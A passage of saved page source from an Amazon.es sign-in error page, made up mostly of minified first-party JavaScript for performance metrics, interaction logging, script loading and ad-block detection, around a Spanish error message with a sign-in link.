            }), s.once("$afterunload", function() {
                o = 1, q()
            }), s.on("$afterPageTransition", function() {
                y = 0, I = w
            }), s.register(g, {
                log: T,
                register: function(n) {
                    m.push(n)
                }
            }))
        });
        csa.plugin(function(n) {
            var r = n.config["Events.SushiEndpoint"];
            n("Transport")("register", {
                accepts: function(n) {
                    return n.schemaId
                },
                post: function(n) {
                    var t = n.map(function(n) {
                        return {
                            data: n
                        }
                    });
                    return {
                        url: r,
                        body: JSON.stringify({
                            events: t
                        })
                    }
                },
                preflight: function() {
                    var n, t = /\/\/(.*?)\//.exec(r);
                    return t && t[1] && (n = "https://" + t[1] + "/ping"), {
                        url: n
                    }
                },
                chunks: function(n) {
                    for (var t = []; 500 < n.length;) t.push(n.splice(0, 500));
                    return t.push(n), t
                }
            })
        });
        csa.plugin(function(n) {
            var t, a, o, r, e = n.config,
                i = "PageViews",
                d = e[i + ".ImpressionMinimumTime"] || 1e3,
                s = "hidden",
                c = "innerHeight",
                l = "innerWidth",
                g = "renderedTo",
                f = g + "Viewed",
                m = g + "Meaningful",
                u = g + "Impressed",
                p = 1,
                v = 2,
                h = 3,
                w = 4,
                y = 5,
                P = "loaded",
                b = 7,
                I = 8,
                T = n.global,
                E = n.on,
                V = n("Events", {
                    producerId: "csa",
                    lob: e.lob || "0"
                }),
                $ = T.document,
                M = {},
                S = {},
                H = y;

            function K(e) {
                if (!M[b]) {
                    var i;
                    if (M[e] = n.time(), e !== h && e !== P || (t = t || M[e]), t && H === w) a = a || M[e], (i = {})[m] = t - o, i[f] = a - o, R("PageView.5", i), r = r || n.timeout(j, d);
                    if (e !== y && e !== p && e !== v || (clearTimeout(r), r = 0), e !== p && e !== v || R("PageRender.4", {
                            transitionType: e === p ? "hard" : "soft"
                        }), e === b)(i = {})[m] = t - o, i[f] = a - o, i[u] = M[e] - o, R("PageImpressed.3", i)
                }
            }

            function R(e, i) {
                S[e] || (i.schemaId = "<ns>." + e, V("log", i, {
                    ent: "all"
                }), S[e] = 1)
            }

            function W() {
                0 === T[c] && 0 === T[l] ? (H = I, n("Events")("setEntity", {
                    page: {
                        viewport: "hidden-iframe"
                    }
                })) : H = $[s] ? y : w, K(H)
            }

            function j() {
                K(b), r = 0
            }

            function k() {
                var e = o ? v : p;
                M = {}, S = {}, a = t = 0, o = n.time(), K(e), W()
            }

            function q() {
                var e = $.readyState;
                "interactive" === e && K(h), "complete" === e && K(P)
            }
            e["KillSwitch." + i] || ($ && void 0 !== $[s] ? (k(), E($, "visibilitychange", W, !1), E($, "readystatechange", q, !1), E("$afterPageTransition", k), E("$timing:loaded", q), n.once("$load", q)) : n.warn("Page visibility not supported"))
        });
        csa.plugin(function(c) {
            var s = c.config["Interactions.ParentChainLength"] || 35,
                e = "click",
                r = "touches",
                f = "timeStamp",
                o = "length",
                u = "pageX",
                g = "pageY",
                p = "pageXOffset",
                h = "pageYOffset",
                m = 250,
                v = 5,
                d = 200,
                l = .5,
                t = {
                    capture: !0,
                    passive: !0
                },
                X = c.global,
                Y = c.emit,
                n = c.on,
                x = X.Math.abs,
                a = (X.document || {}).documentElement || {},
                y = {
                    x: 0,
                    y: 0,
                    t: 0,
                    sX: 0,
                    sY: 0
                },
                N = {
                    x: 0,
                    y: 0,
                    t: 0,
                    sX: 0,
                    sY: 0
                };

            function b(t) {
                if (t.id) return "//*[@id='" + t.id + "']";
                var e = function(t) {
                        var e, n = 1;
                        for (e = t.previousSibling; e; e = e.previousSibling) e.nodeName === t.nodeName && (n += 1);
                        return n
                    }(t),
                    n = t.nodeName;
                return 1 !== e && (n += "[" + e + "]"), t.parentNode && (n = b(t.parentNode) + "/" + n), n
            }

            function I(t, e, n) {
                var a = c("Content", {
                        target: n
                    }),
                    i = {
                        schemaId: "<ns>.ContentInteraction.2",
                        interaction: t,
                        interactionData: e,
                        messageId: c.UUID()
                    };
                if (n) {
                    var r = b(n);
                    r && (i.attribution = r);
                    var o = function(t) {
                        for (var e = t, n = e.tagName, a = !1, i = t ? t.href : null, r = 0; r < s; r++) {
                            if (!e || !e.parentElement) {
                                a = !0;
                                break
                            }
                            n = (e = e.parentElement).tagName + "/" + n, i = i || e.href
                        }
                        return a || (n = ".../" + n), {
                            pc: n,
                            hr: i
                        }
                    }(n);
                    o.pc && (i.interactionData.parentChain = o.pc), o.hr && (i.interactionData.href = o.hr)
                }
                a("log", i), Y("$content.interaction", {
                    e: i,
                    w: a
                })
            }

            function i(t) {
                I(e, {
                    interactionX: "" + t.pageX,
                    interactionY: "" + t.pageY
                }, t.target)
            }

            function C(t) {
                if (t && t[r] && 1 === t[r][o]) {
                    var e = t[r][0];
                    N = y = {
                        e: t.target,
                        x: e[u],
                        y: e[g],
                        t: t[f],
                        sX: X[p],
                        sY: X[h]
                    }
                }
            }

            function D(t) {
                if (t && t[r] && 1 === t[r][o] && y && N) {
                    var e = t[r][0],
                        n = t[f],
                        a = n - N.t,
                        i = {
                            e: t.target,
                            x: e[u],
                            y: e[g],
                            t: n,
                            sX: X[p],
                            sY: X[h]
                        };
                    N = i, d <= a && (y = i)
                }
            }

            function E(t) {
                if (t) {
                    var e = x(y.x - N.x),
                        n = x(y.y - N.y),
                        a = x(y.sX - N.sX),
                        i = x(y.sY - N.sY),
                        r = t[f] - y.t;
                    if (m < 1e3 * e / r && v < e || m < 1e3 * n / r && v < n) {
                        var o = n < e;
                        o && a && e * l <= a || !o && i && n * l <= i || I((o ? "horizontal" : "vertical") + "-swipe", {
                            interactionX: "" + y.x,
                            interactionY: "" + y.y,
                            endX: "" + N.x,
                            endY: "" + N.y
                        }, y.e)
                    }
                }
            }
            n(a, e, i, t), n(a, "touchstart", C, t), n(a, "touchmove", D, t), n(a, "touchend", E, t)
        });
        csa.plugin(function(r) {
            var a, o, t, c, e, n = "MutationObserver",
                f = "observe",
                u = "disconnect",
                i = "mutObs",
                l = "_csa_flt",
                b = "_csa_llt",
                m = "_csa_mr",
                d = "_csa_mi",
                v = "lastChild",
                p = "length",
                _ = {
                    childList: !0,
                    subtree: !0
                },
                g = 10,
                h = 25,
                s = 1e3,
                y = 4,
                O = r.global,
                k = O.document,
                w = k.body || k.documentElement,
                I = Date.now,
                L = [],
                B = [],
                M = [],
                Y = 0,
                $ = 0,
                x = 0,
                A = 1,
                C = [],
                D = [],
                E = 0,
                F = r.blank,
                N = {
                    buffered: 1
                },
                S = 0;

            function T(e) {
                r.global.ue_csa_ss_tag || r.emit("$csmTag:" + e, 0, N)
            }
            I && O[n] ? (T(i + "Yes"), Y = 0, o = new O[n](j), (t = new O[n](V))[f](w, {
                attributes: !0,
                subtree: !0,
                attributeFilter: ["src"],
                attributeOldValue: !0
            }), F = r.on(O, "scroll", q, {
                passive: !0
            }), r.once("$ready", H), A && (G(), e = r.interval(z, s)), r.register("SpeedIndexBuffers", {
                getBuffers: function(e) {
                    e && (H(), q(), e(Y, C, L, B, M), o && o[u](), t && t[u](), F())
                },
                registerListener: function(e) {
                    a = e
                },
                replayModuleIsLive: function() {
                    r.timeout(H, 0)
                }
            })) : T(i + "No");

            function V(e) {
                L.push({
                    t: I(),
                    m: e
                })
            }

            function j(e) {
                B.push({
                    t: I(),
                    m: e
                }), S || T(i + "Active"), S = x = 1, a && a()
            }

            function q() {
                x && (M.push({
                    t: I(),
                    y: $
                }), $ = O.pageYOffset, x = 0)
            }

            function z() {
                var e = I();
                (!c || s < e - c) && G()
            }

            function G() {
                for (var e = w, t = I(), n = [], u = [], i = 0, s = 0; e;) e[l] ? ++i : (e[l] = t, n.push(e), s = 1), u[p] < y && u.push(e), e[d] = E, e[b] = t, e = e[v];
                s && (i < D[p] && function(e) {
                    for (var t = e, n = D[p]; t < n; t++) {
                        var u = D[t];
                        if (u) {
                            if (u[m]) break;
                            if (u[d] < E) {
                                u[m] = 1, o[f](u, _);
                                break
                            }
                        }
                    }
                }(i), D = u, C.push({
                    t: t,
                    m: n
                }), ++E, x = s, a && a()), A && r.timeout(G, s ? g : h), c = t
            }

            function H() {
                A && (A = 0, e && O.clearInterval(e), e = null, G(), o[f](w, _))
            }
        });

        var ue_csa_ss_tag = false;
        csa.plugin(function(b) {
            var a = b.global,
                e = a.uet,
                f = a.uex,
                c = a.ue,
                d = a.Object,
                g = 0,
                h = {
                    largestContentfulPaint: "lcp",
                    speedIndex: "si",
                    atfSpeedIndex: "atfsi",
                    visuallyLoaded50: "vl50",
                    visuallyLoaded90: "vl90",
                    visuallyLoaded100: "vl100"
                },
                l = "perfNo perfYes browserQuiteFn browserQuiteUd browserQuiteLd browserQuiteMut mutObsNo mutObsYes mutObsActive startVL endVL".split(" ");
            b && e && f && d.keys && c && (b.once("$ditched.beforemitigation", function() {
                g = 1
            }), d.keys(h).forEach(function(k) {
                b.on("$timing:" + k, function(b) {
                    var a = h[k];
                    if (c.isl || g) {
                        var d = "csa:" + a;
                        e(a, d, void 0, b);
                        f("at", d)
                    } else e(a, void 0, void 0, b)
                })
            }), a.ue_csa_ss_tag || l.forEach(function(a) {
                b.on("$csmTag:" + a, function() {
                    c.tag && c.tag(a);
                    (c.isl || g) && f("at", "csa:" + a)
                }, {
                    buffered: 1
                })
            }))
        });
    </script>
    <script type='text/javascript'>
        (function() {
            function l(a) {
                for (var c = b.location.search.substring(1).split("&"), e = 0; e < c.length; e++) {
                    var d = c[e].split("=");
                    if (d[0] === a) return d[1]
                }
            }
            window.amzn = window.amzn || {};
            amzn.copilot = amzn.copilot || {};
            var b = window,
                f = document,
                g = b.P || b.AmazonUIPageJS,
                h = f.head || f.getElementsByTagName("head")[0],
                m = 0,
                n = 0;
            amzn.copilot.checkCoPilotSession = function() {
                f.cookie.match("cpidv") && ("undefined" !== typeof jQuery && k(jQuery), g && g.when && g.when("jQuery").execute(function(a) {
                    k(a)
                }), b.amznJQ && b.amznJQ.available && b.amznJQ.available("jQuery",
                    function() {
                        k(jQuery)
                    }), b.jQuery || g || b.amznJQ || q())
            };
            var q = function() {
                    m ? b.ue && "function" === typeof b.ue.count && b.ue.count("cpJQUnavailable", 1) : (m = 1, f.addEventListener ? f.addEventListener("DOMContentLoaded", amzn.copilot.checkCoPilotSession, !1) : f.attachEvent && f.attachEvent("onreadystatechange", function() {
                        "complete" === f.readyState && amzn.copilot.checkCoPilotSession()
                    }))
                },
                k = function(a) {
                    if (!n) {
                        n = 1;
                        amzn.copilot.jQuery = a;
                        a = l("debugJS");
                        var c = "https:" === b.location.protocol ? 1 : 0,
                            e = 1;
                        url = "/gp/copilot/handlers/copilot_strings_resources.html";
                        window.texas && texas.locations && (url = texas.locations.makeUrl(url));
                        g && g.AUI_BUILD_DATE && (e = 0);
                        amzn.copilot.jQuery.ajax && amzn.copilot.jQuery.ajax({
                            url: url,
                            dataType: "json",
                            data: {
                                isDebug: a,
                                isSecure: c,
                                includeAUIP: e
                            },
                            success: function(a) {
                                amzn.copilot.vip = a.serviceEndPoint;
                                amzn.copilot.enableMultipleTabSession = a.isFollowMe;
                                r(a)
                            },
                            error: function() {
                                b.ue.count("cpLoadResourceError", 1)
                            }
                        })
                    }
                },
                r = function(a) {
                    var c = amzn.copilot.jQuery,
                        e = function() {
                            amzn.copilot.setup(c.extend({
                                isContinuedSession: !0
                            }, a))
                        };
                    a.CSSUrls &&
                        c.each(a.CSSUrls[0], function(a, c) {
                            var b = f.createElement("link");
                            b.type = "text/css";
                            b.rel = "stylesheet";
                            b.href = c;
                            h.appendChild(b)
                        });
                    a.CSSTag && s(a.CSSTag);
                    if (a.JSUrls) {
                        var d = l("forceSynchronousJS"),
                            b = a.JSUrls[0];
                        c.each(b, function(a, c) {
                            a === b.length - 1 ? p(c, d, e) : p(c, d)
                        })
                    }
                    a.JSTag && (t(a.JSTag), P.when("CSCoPilotPresenterAsset").execute(function() {
                        e()
                    }))
                },
                t = function(a) {
                    var c = f.createElement("div");
                    c.innerHTML = a;
                    a = 0;
                    for (var b = c.children.length; a < b; a++) {
                        var d = f.createElement("script");
                        d.type = "text/javascript";
                        d.innerHTML = c.children[a].innerHTML;
                        h.appendChild(d)
                    }
                },
                s = function(a) {
                    var b = f.createElement("div");
                    b.innerHTML = a;
                    a = 0;
                    for (var e = b.children.length; a < e; a++) h.appendChild(b.children[a])
                },
                p = function(a, b, e) {
                    var d = f.createElement("script");
                    d.type = "text/javascript";
                    d.src = a;
                    d.async = b ? !1 : !0;
                    e && (d.onload = e);
                    h.appendChild(d)
                }
        })();

        amzn.copilot.checkCoPilotSession();
    </script>

    <script>
        window.ue && ue.count && ue.count('CSMLibrarySize', 18524)
    </script>

    <div id="wrapper">
        <div id="error-slot">








            <div id="ap_error_page_header" class="ap_error_page_header">
                <img src="https://m.media-amazon.com/images/G/30/x-locale/common/amazon-logo._CB485942491_.gif" />
            </div>





            <div id="ap_error_page_wrapper" class="ap_error_page_wrapper">
                <table cellpadding="4" border="0" align="center" width="800">
                    <tbody>
                        <tr>
                            <td style="padding: 10px">
                                <img src="https://m.media-amazon.com/images/G/30/associates/question-mark._CB485935157_.gif" />
                            </td>
                            <td>
                                <div id="ap_error_page_title" class="ap_error_page_title">
                                    <h1>Ha surgido un problema</h1>
                                </div>
                                <div id="ap_error_page_message" class="ap_error_page_message">
                                    Lo sentimos. Ha ocurrido un error al iniciar sesión. Por favor, vuelva a intentarlo.
                                    
                                    <div id="ap_error_return_home" class="ap_error_return_home">

                                        <img src="https://m.media-amazon.com/images/G/30/x-locale/common/orange-arrow._CB485935500_.gif" />
                                        Volver a la página de inicio de Amazon.es
					<br>
					<br>
					<a href="https://www.amazon.es/ap/signin?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.es%2Fyour-orders%2Forders%3Fref_%3Dnav_orders_first&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=amzn_retail_yourorders_es&openid.mode=checkid_setup&language=es_ES&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0">Iniciar sesión.</a> 


                                    </div>
                                </div>



                            </td>
                        </tr>
                    </tbody>
                </table>
            </div>



        </div>
    </div>

    <div id='be' style="display:none;visibility:hidden;">
        <form name='ue_backdetect' action="get"><input type="hidden" name='ue_back' value='1' /></form>


        <script type="text/javascript">
            window.ue_ibe = (window.ue_ibe || 0) + 1;
            if (window.ue_ibe === 1) {
                (function(e, c) {
                    function h(b, a) {
                        f.push([b, a])
                    }

                    function g(b, a) {
                        if (b) {
                            var c = e.head || e.getElementsByTagName("head")[0] || e.documentElement,
                                d = e.createElement("script");
                            d.async = "async";
                            d.src = b;
                            d.setAttribute("crossorigin", "anonymous");
                            a && a.onerror && (d.onerror = a.onerror);
                            a && a.onload && (d.onload = a.onload);
                            c.insertBefore(d, c.firstChild)
                        }
                    }

                    function k() {
                        ue.uels = g;
                        for (var b = 0; b < f.length; b++) {
                            var a = f[b];
                            g(a[0], a[1])
                        }
                        ue.deffered = 1
                    }
                    var f = [];
                    c.ue && (ue.uels = h, c.ue.attach && c.ue.attach("load", k))
                })(document, window);


                if (window.ue && window.ue.uels) {
                    ue.uels("https://images-eu.ssl-images-amazon.com/images/I/31bJewCvY-L.js");
                }
                var ue_mbl = ue_csm.ue.exec(function(h, a) {
                    function s(c) {
                        b = c || {};
                        a.AMZNPerformance = b;
                        b.transition = b.transition || {};
                        b.timing = b.timing || {};
                        if (a.csa) {
                            var d;
                            b.timing.transitionStart && (d = b.timing.transitionStart);
                            b.timing.processStart && (d = b.timing.processStart);
                            d && (csa("PageTiming")("mark", "nativeTransitionStart", d), csa("PageTiming")("mark", "transitionStart", d))
                        }
                        h.ue.exec(t, "csm-android-check")() && b.tags instanceof Array && (c = -1 != b.tags.indexOf("usesAppStartTime") || b.transition.type ? !b.transition.type && -1 <
                            b.tags.indexOf("usesAppStartTime") ? "warm-start" : void 0 : "view-transition", c && (b.transition.type = c));
                        n = null;
                        "reload" === e._nt && h.ue_orct || "intrapage-transition" === e._nt ? u(b) : "undefined" === typeof e._nt && f && f.timing && f.timing.navigationStart && a.history && "function" === typeof a.History && "object" === typeof a.history && a.history.length && 1 != a.history.length && (b.timing.transitionStart = f.timing.navigationStart);
                        p && e.ssw(q, "" + (b.timing.transitionStart || n || ""));
                        c = b.transition;
                        d = e._nt ? e._nt : void 0;
                        c.subType = d;
                        a.ue &&
                            a.ue.tag && a.ue.tag("has-AMZNPerformance");
                        e.isl && a.uex && a.uex("at", "csm-timing");
                        v()
                    }

                    function w(c) {
                        a.ue && a.ue.count && a.ue.count("csm-cordova-plugin-failed", 1)
                    }

                    function t() {
                        return a.cordova && a.cordova.platformId && "android" == a.cordova.platformId
                    }

                    function u() {
                        if (p) {
                            var c = e.ssw(q),
                                a = function() {},
                                x = e.count || a,
                                a = e.tag || a,
                                k = b.timing.transitionStart,
                                g = c && !c.e && c.val;
                            n = c = g ? +c.val : null;
                            k && g && k > c ? (x("csm.jumpStart.mtsDiff", k - c || 0), a("csm-rld-mts-gt")) : k && g ? a("csm-rld-mts-leq") : g ? k || a("csm-rld-mts-no-new") : a("csm-rld-mts-no-old")
                        }
                        f &&
                            f.timing && f.timing.navigationStart ? b.timing.transitionStart = f.timing.navigationStart : delete b.timing.transitionStart
                    }

                    function v() {
                        try {
                            a.P.register("AMZNPerformance", function() {
                                return b
                            })
                        } catch (c) {}
                    }

                    function r() {
                        if (!b) return "";
                        ue_mbl.cnt = null;
                        var c = b.timing,
                            d = b.transition,
                            d = ["mts", l(c.transitionStart), "mps", l(c.processStart), "mtt", d.type, "mtst", d.subType, "mtlt", d.launchType];
                        a.ue && a.ue.tag && (c.fr_ovr && a.ue.tag("fr_ovr"), c.fcp_ovr && a.ue.tag("fcp_ovr"), d.push("fr_ovr", l(c.fr_ovr), "fcp_ovr", l(c.fcp_ovr)));
                        for (var c = "", e = 0; e < d.length; e += 2) {
                            var f = d[e],
                                g = d[e + 1];
                            "undefined" !== typeof g && (c += "&" + f + "=" + g)
                        }
                        return c
                    }

                    function l(a) {
                        if ("undefined" !== typeof a && "undefined" !== typeof m) return a - m
                    }

                    function y(a, d) {
                        b && (m = d, b.timing.transitionStart = a, b.transition.type = "view-transition", b.transition.subType = "ajax-transition", b.transition.launchType = "normal", ue_mbl.cnt = r)
                    }
                    var e = h.ue || {},
                        m = h.ue_t0,
                        q = "csm-last-mts",
                        p = 1 === h.ue_sswmts,
                        n, f = a.performance,
                        b;
                    if (a.P && a.P.when && a.P.register) return 1 === a.ue_fnt && (m = a.aPageStart ||
                        h.ue_t0), a.P.when("CSMPlugin").execute(function(a) {
                        a.buildAMZNPerformance && a.buildAMZNPerformance({
                            successCallback: s,
                            failCallback: w
                        })
                    }), {
                        cnt: r,
                        ajax: y
                    }
                }, "mobile-timing")(ue_csm, ue_csm.window);

                (function(d) {
                    d._uess = function() {
                        var a = "";
                        screen && screen.width && screen.height && (a += "&sw=" + screen.width + "&sh=" + screen.height);
                        var b = function(a) {
                                var b = document.documentElement["client" + a];
                                return "CSS1Compat" === document.compatMode && b || document.body["client" + a] || b
                            },
                            c = b("Width"),
                            b = b("Height");
                        c && b && (a += "&vw=" + c + "&vh=" + b);
                        return a
                    }
                })(ue_csm);

                (function(a) {
                    function d(a) {
                        c && c("log", a)
                    }
                    var b = document.ue_backdetect,
                        c = a.csa && a.csa("Errors", {
                            producerId: "csa",
                            logOptions: {
                                ent: "all"
                            }
                        });
                    a.ue_err.buffer && c && (a.ue_err.buffer.forEach(d), a.ue_err.buffer.push = d);
                    b && b.ue_back && a.ue && (a.ue.bfini = b.ue_back.value);
                    a.uet && a.uet("be");
                    a.onLdEnd && (window.addEventListener ? window.addEventListener("load", a.onLdEnd, !1) : window.attachEvent && window.attachEvent("onload", a.onLdEnd));
                    a.ueh && a.ueh(0, window, "load", a.onLd, 1);
                    a.ue && a.ue.tag && (a.ue_furl ? (b = a.ue_furl.replace(/\./g,
                        "-"), a.ue.tag(b)) : a.ue.tag("nofls"))
                })(ue_csm);

                (function(g, h) {
                    function d(a, d) {
                        var b = {};
                        if (!e || !f) try {
                            var c = h.sessionStorage;
                            c ? a && ("undefined" !== typeof d ? c.setItem(a, d) : b.val = c.getItem(a)) : f = 1
                        } catch (g) {
                            e = 1
                        }
                        e && (b.e = 1);
                        return b
                    }
                    var b = g.ue || {},
                        a = "",
                        f, e, c, a = d("csmtid");
                    f ? a = "NA" : a.e ? a = "ET" : (a = a.val, a || (a = b.oid || "NI", d("csmtid", a)), c = d(b.oid), c.e || (c.val = c.val || 0, d(b.oid, c.val + 1)), b.ssw = d);
                    b.tabid = a
                })(ue_csm, ue_csm.window);

                ue_csm.ue.exec(function(e, f) {
                    var a = e.ue || {},
                        b = a._wlo,
                        d;
                    if (a.ssw) {
                        d = a.ssw("CSM_previousURL").val;
                        var c = f.location,
                            b = b ? b : c && c.href ? c.href.split("#")[0] : void 0;
                        c = (b || "") === a.ssw("CSM_previousURL").val;
                        !c && b && a.ssw("CSM_previousURL", b);
                        d = c ? "reload" : d ? "intrapage-transition" : "first-view"
                    } else d = "unknown";
                    a._nt = d
                }, "NavTypeModule")(ue_csm, window);
                ue_csm.ue.exec(function(c, a) {
                    function g(a) {
                        a.run(function(e) {
                            d.tag("csm-feature-" + a.name + ":" + e);
                            d.isl && c.uex("at")
                        })
                    }
                    if (a.addEventListener)
                        for (var d = c.ue || {}, f = [{
                                name: "touch-enabled",
                                run: function(b) {
                                    var e = function() {
                                            a.removeEventListener("touchstart", c, !0);
                                            a.removeEventListener("mousemove", d, !0)
                                        },
                                        c = function() {
                                            b("true");
                                            e()
                                        },
                                        d = function() {
                                            b("false");
                                            e()
                                        };
                                    a.addEventListener("touchstart", c, !0);
                                    a.addEventListener("mousemove", d, !0)
                                }
                            }], b = 0; b < f.length; b++) g(f[b])
                }, "csm-features")(ue_csm, window);


                (function(a, e) {
                    function d(a) {
                        b && b("recordCounter", a.c, a.v)
                    }
                    var c = e.images,
                        b = a.csa && a.csa("Metrics", {
                            producerId: "csa"
                        });
                    c && c.length && a.ue.count("totalImages", c.length);
                    a.ue.cv.buffer && b && (a.ue.cv.buffer.forEach(d), a.ue.cv.buffer.push = d)
                })(ue_csm, document);
                (function(b) {
                    function c() {
                        var d = [];
                        a.log && a.log.isStub && a.log.replay(function(a) {
                            e(d, a)
                        });
                        a.clog && a.clog.isStub && a.clog.replay(function(a) {
                            e(d, a)
                        });
                        d.length && (a._flhs += 1, n(d), p(d))
                    }

                    function g() {
                        a.log && a.log.isStub && (a.onflush && a.onflush.replay && a.onflush.replay(function(a) {
                            a[0]()
                        }), a.onunload && a.onunload.replay && a.onunload.replay(function(a) {
                            a[0]()
                        }), c())
                    }

                    function e(d, b) {
                        var c = b[1],
                            f = b[0],
                            e = {};
                        a._lpn[c] = (a._lpn[c] || 0) + 1;
                        e[c] = f;
                        d.push(e)
                    }

                    function n(b) {
                        q && (a._lpn.csm = (a._lpn.csm || 0) + 1, b.push({
                            csm: {
                                k: "chk",
                                f: a._flhs,
                                l: a._lpn,
                                s: "inln"
                            }
                        }))
                    }

                    function p(a) {
                        if (h) a = k(a), b.navigator.sendBeacon(l, a);
                        else {
                            a = k(a);
                            var c = new b[f];
                            c.open("POST", l, !0);
                            c.setRequestHeader && c.setRequestHeader("Content-type", "text/plain");
                            c.send(a)
                        }
                    }

                    function k(a) {
                        return JSON.stringify({
                            rid: b.ue_id,
                            sid: b.ue_sid,
                            mid: b.ue_mid,
                            mkt: b.ue_mkt,
                            sn: b.ue_sn,
                            reqs: a
                        })
                    }
                    var f = "XMLHttpRequest",
                        q = 1 === b.ue_ddq,
                        a = b.ue,
                        r = b[f] && "withCredentials" in new b[f],
                        h = b.navigator && b.navigator.sendBeacon,
                        l = "//" + b.ue_furl + "/1/batch/1/OE/",
                        m = b.ue_fci_ft || 5E3;
                    a && (r || h) &&
                        (a._flhs = a._flhs || 0, a._lpn = a._lpn || {}, a.attach && (a.attach("beforeunload", a.exec(g, "fcli-bfu")), a.attach("pagehide", a.exec(g, "fcli-ph"))), m && b.setTimeout(a.exec(c, "fcli-t"), m), a._ffci = a.exec(c))
                })(window);


                (function(k, c) {
                    function l(a, b) {
                        return a.filter(function(a) {
                            return a.initiatorType == b
                        })
                    }

                    function f(a, c) {
                        if (b.t[a]) {
                            var g = b.t[a] - b._t0,
                                e = c.filter(function(a) {
                                    return 0 !== a.responseEnd && m(a) < g
                                }),
                                f = l(e, "script"),
                                h = l(e, "link"),
                                k = l(e, "img"),
                                n = e.map(function(a) {
                                    return a.name.split("/")[2]
                                }).filter(function(a, b, c) {
                                    return a && c.lastIndexOf(a) == b
                                }),
                                q = e.filter(function(a) {
                                    return a.duration < p
                                }),
                                s = g - Math.max.apply(null, e.map(m)) < r | 0;
                            "af" == a && (b._afjs = f.length);
                            return a + ":" + [e[d], f[d], h[d], k[d], n[d], q[d], s].join("-")
                        }
                    }

                    function m(a) {
                        return a.responseEnd - (b._t0 - c.timing.navigationStart)
                    }

                    function n() {
                        var a = c[h]("resource"),
                            d = f("cf", a),
                            g = f("af", a),
                            a = f("ld", a);
                        delete b._rt;
                        b._ld = b.t.ld - b._t0;
                        b._art && b._art();
                        return [d, g, a].join("_")
                    }
                    var p = 20,
                        r = 50,
                        d = "length",
                        b = k.ue,
                        h = "getEntriesByType";
                    b._rre = m;
                    b._rt = c && c.timing && c[h] && n
                })(ue_csm, window.performance);


                (function(c, d) {
                    var b = c.ue,
                        a = d.navigator;
                    b && b.tag && a && (a = a.connection || a.mozConnection || a.webkitConnection) && a.type && b.tag("netInfo:" + a.type)
                })(ue_csm, window);


                (function(c, d) {
                    function h(a, b) {
                        for (var c = [], d = 0; d < a.length; d++) {
                            var e = a[d],
                                f = b.encode(e);
                            if (e[k]) {
                                var g = b.metaSep,
                                    e = e[k],
                                    l = b.metaPairSep,
                                    h = [],
                                    m = void 0;
                                for (m in e) e.hasOwnProperty(m) && h.push(m + "=" + e[m]);
                                e = h.join(l);
                                f += g + e
                            }
                            c.push(f)
                        }
                        return c.join(b.resourceSep)
                    }

                    function s(a) {
                        var b = a[k] = a[k] || {};
                        b[t] || (b[t] = c.ue_mid);
                        b[u] || (b[u] = c.ue_sid);
                        b[f] || (b[f] = c.ue_id);
                        b.csm = 1;
                        a = "//" + c.ue_furl + "/1/" + a[v] + "/1/OP/" + a[w] + "/" + a[x] + "/" + h([a], y);
                        if (n) try {
                            n.call(d[p], a)
                        } catch (g) {
                            c.ue.sbf = 1, (new Image).src = a
                        } else(new Image).src =
                            a
                    }

                    function q() {
                        g && g.isStub && g.replay(function(a, b, c) {
                            a = a[0];
                            b = a[k] = a[k] || {};
                            b[f] = b[f] || c;
                            s(a)
                        });
                        l.impression = s;
                        g = null
                    }
                    if (!(1 < c.ueinit)) {
                        var k = "metadata",
                            x = "impressionType",
                            v = "foresterChannel",
                            w = "programGroup",
                            t = "marketplaceId",
                            u = "session",
                            f = "requestId",
                            p = "navigator",
                            l = c.ue || {},
                            n = d[p] && d[p].sendBeacon,
                            r = function(a, b, c, d) {
                                return {
                                    encode: d,
                                    resourceSep: a,
                                    metaSep: b,
                                    metaPairSep: c
                                }
                            },
                            y = r("", "?", "&", function(a) {
                                return h(a.impressionData, z)
                            }),
                            z = r("/", ":", ",", function(a) {
                                return a.featureName + ":" + h(a.resources,
                                    A)
                            }),
                            A = r(",", "@", "|", function(a) {
                                return a.id
                            }),
                            g = l.impression;
                        n ? q() : (l.attach("load", q), l.attach("beforeunload", q));
                        try {
                            d.P && d.P.register && d.P.register("impression-client", function() {})
                        } catch (B) {
                            c.ueLogError(B, {
                                logLevel: "WARN"
                            })
                        }
                    }
                })(ue_csm, window);



                var ue_pty = "AuthenticationPortal";

                var ue_spty = "Error404Page";



                var ue_adb = 4;
                var ue_adb_rtla = 1;
                ue_csm.ue.exec(function(y, a) {
                    function t() {
                        if (d && f) {
                            var a;
                            a: {
                                try {
                                    a = d.getItem(g);
                                    break a
                                } catch (c) {}
                                a = void 0
                            }
                            if (a) return b = a, !0
                        }
                        return !1
                    }

                    function u() {
                        if (a.fetch) fetch(m).then(function(a) {
                            if (!a.ok) throw Error(a.statusText);
                            return a.text ? a.text() : null
                        }).then(function(b) {
                            b ? (-1 < b.indexOf("window.ue_adb_chk = 1") && (a.ue_adb_chk = 1), n()) : h()
                        })["catch"](h);
                        else e.uels(m, {
                            onerror: h,
                            onload: n
                        })
                    }

                    function h() {
                        b = k;
                        l();
                        if (f) try {
                            d.setItem(g, b)
                        } catch (a) {}
                    }

                    function n() {
                        b = 1 === a.ue_adb_chk ? p : k;
                        l();
                        if (f) try {
                            d.setItem(g,
                                b)
                        } catch (c) {}
                    }

                    function q() {
                        a.ue_adb_rtla && c && 0 < c.ec && !1 === r && (c.elh = null, ueLogError({
                            m: "Hit Info",
                            fromOnError: 1
                        }, {
                            logLevel: "INFO",
                            adb: b
                        }), r = !0)
                    }

                    function l() {
                        e.tag(b);
                        e.isl && a.uex && uex("at", b);
                        s && s.updateCsmHit("adb", b);
                        c && 0 < c.ec ? q() : a.ue_adb_rtla && c && (c.elh = q)
                    }

                    function v() {
                        return b
                    }
                    if (a.ue_adb) {
                        a.ue_fadb = a.ue_fadb || 10;
                        var e = a.ue,
                            k = "adblk_yes",
                            p = "adblk_no",
                            m = "https://m.media-amazon.com/images/G/01/csm/showads.v2.js?category=ad&adstype=-ad-column-&ad_size=-housead-",
                            b = "adblk_unk",
                            d;
                        a: {
                            try {
                                d = a.localStorage;
                                break a
                            } catch (z) {}
                            d = void 0
                        }
                        var g = "csm:adb",
                            c = a.ue_err,
                            s = e.cookie,
                            f = void 0 !== a.localStorage,
                            w = Math.random() > 1 - 1 / a.ue_fadb,
                            r = !1,
